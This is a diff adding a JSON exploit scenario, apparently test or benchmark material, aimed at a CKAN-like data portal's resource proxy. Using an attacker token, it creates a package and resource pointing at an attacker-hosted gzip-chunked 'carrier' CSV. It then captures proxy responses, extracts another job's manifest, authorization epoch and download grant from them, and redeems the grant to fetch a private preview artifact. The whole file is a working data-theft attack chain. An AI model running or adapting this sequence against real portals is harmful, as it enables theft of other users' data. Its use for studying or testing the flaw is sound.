@@ -1,0 +1,204 @@
+{
+  "version": 1,
+  "origin": {
+    "routes": [
+      {
+        "path": "/carrier",
+        "HEAD": {
+          "status": 200,
+          "headers": [
+            [
+              "Content-Type",
+              "text/csv"
+            ]
+          ]
+        },
+        "GET": {
+          "status": 200,
+          "headers": [
+            [
+              "Content-Type",
+              "text/csv"
+            ],
+            [
+              "Content-Encoding",
+              "gzip"
+            ],
+            [
+              "Transfer-Encoding",
+              "chunked"
+            ]
+          ],
+          "wire_body_b64": "MmMNCh+LCABp0NdqAv8zNgACXq5qpeTEoqLM1CIlK6XEotzUFKVaADBiMUAaAAAADQowDQoNCg=="
+        }
+      }
+    ]
+  },
+  "operations": [
+    {
+      "mode": "http",
+      "method": "POST",
+      "path": "/api/3/action/package_create",
+      "headers": [
+        [
+          "Authorization",
+          "${ATTACKER_TOKEN}"
+        ],
+        [
+          "Content-Type",
+          "application/json"
+        ]
+      ],
+      "json": {
+        "name": "owned-preview-set",
+        "owner_org": "${ATTACKER_ORG_ID}",
+        "private": false
+      },
+      "extract": {
+        "pkg": "/result/id"
+      }
+    },
+    {
+      "mode": "http",
+      "method": "POST",
+      "path": "/api/3/action/resource_create",
+      "headers": [
+        [
+          "Authorization",
+          "${ATTACKER_TOKEN}"
+        ],
+        [
+          "Content-Type",
+          "application/json"
+        ]
+      ],
+      "json": {
+        "package_id": "${pkg}",
+        "url": "${ORIGIN_BASE}/carrier",
+        "name": "carrier",
+        "format": "csv"
+      },
+      "extract": {
+        "rid": "/result/id"
+      }
+    },
+    {
+      "mode": "http",
+      "method": "GET",
+      "path": "/preview/catalog/by-label/quarterly-energy-disclosure-2026",
+      "extract": {
+        "srcrev": "/current_source_revision",
+        "pubetag": "/publication_etag"
+      }
+    },
+    {
+      "mode": "raw_capture",
+      "method": "GET",
+      "path": "/dataset/${pkg}/resource/${rid}/proxy",
+      "name": "cap0"
+    },
+    {
+      "mode": "raw_capture",
+      "method": "GET",
+      "path": "/dataset/${pkg}/resource/${rid}/proxy",
+      "name": "cap1"
+    },
+    {
+      "mode": "extract",
+      "from": [
+        "cap0",
+        "cap1"
+      ],
+      "find": "json_object",
+      "where": [
+        [
+          "/kind",
+          "manifest"
+        ],
+        [
+          "/label",
+          "quarterly-energy-disclosure-2026"
+        ],
+        [
+          "/source_revision",
+          "${srcrev}"
+        ]
+      ],
+      "bind": {
+        "job_id": "/job_id",
+        "render_id": "/render_id",
+        "artifact_ref": "/artifact_ref"
+      }
+    },
+    {
+      "mode": "extract",
+      "from": [
+        "cap0",
+        "cap1"
+      ],
+      "find": "json_object",
+      "where": [
+        [
+          "/kind",
+          "ready"
+        ],
+        [
+          "/job_id",
+          "${job_id}"
+        ],
+        [
+          "/render_id",
+          "${render_id}"
+        ]
+      ],
+      "bind": {
+        "epoch": "/authorization_epoch"
+      }
+    },
+    {
+      "mode": "extract",
+      "from": [
+        "cap0",
+        "cap1"
+      ],
+      "find": "json_object",
+      "where": [
+        [
+          "/kind",
+          "download_authority"
+        ],
+        [
+          "/render_id",
+          "${render_id}"
+        ],
+        [
+          "/authorization_epoch",
+          "${epoch}"
+        ],
+        [
+          "/purpose",
+          "original-artifact"
+        ]
+      ],
+      "bind": {
+        "grant": "/grant"
+      }
+    },
+    {
+      "mode": "raw_capture",
+      "method": "GET",
+      "path": "/preview/artifacts/${artifact_ref}",
+      "headers": [
+        [
+          "Preview-Grant",
+          "${grant}"
+        ],
+        [
+          "If-Match",
+          "${pubetag}"
+        ]
+      ],
+      "name": "redeem"
+    }
+  ]
+}
